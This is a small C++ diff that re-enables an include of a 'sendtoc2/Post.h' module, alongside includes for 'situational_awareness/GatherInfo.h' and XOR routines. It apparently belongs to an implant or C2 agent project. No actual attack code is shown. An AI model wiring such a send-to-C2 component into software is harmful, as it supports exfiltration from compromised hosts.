@@ -9,6 +9,7 @@
 #include <string>
 #include <vector>
 #include <algorithm>
+#include <sstream>
 
 
 /* Libraries */
@@ -23,7 +24,7 @@ using json = nlohmann::json;
 #include "../situational_awareness/GatherInfo.h"
 #include "../file/file.h"
 #include "../xor/xor.h"
-//#include "../sendtoc2/Post.h"
+#include "../sendtoc2/Post.h"
 
 /* Variables */
 #define BUF_SIZE 4096
